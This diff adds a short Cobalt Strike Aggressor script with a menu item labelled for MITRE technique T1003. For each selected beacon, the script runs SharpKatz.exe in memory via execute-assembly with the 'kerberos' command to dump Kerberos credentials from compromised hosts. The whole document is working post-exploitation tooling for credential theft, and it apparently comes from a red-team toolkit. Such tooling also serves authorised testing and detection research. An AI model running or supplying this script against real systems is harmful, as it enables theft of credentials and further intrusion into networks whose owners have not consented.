@@ -1,0 +1,14 @@
+item "SharpKatz Kerberos Credentials  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			skkerberos($bid);
+		}
+	}
+	
+	
+sub skkerberos{
+
+bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command kerberos");
+
+}
+	
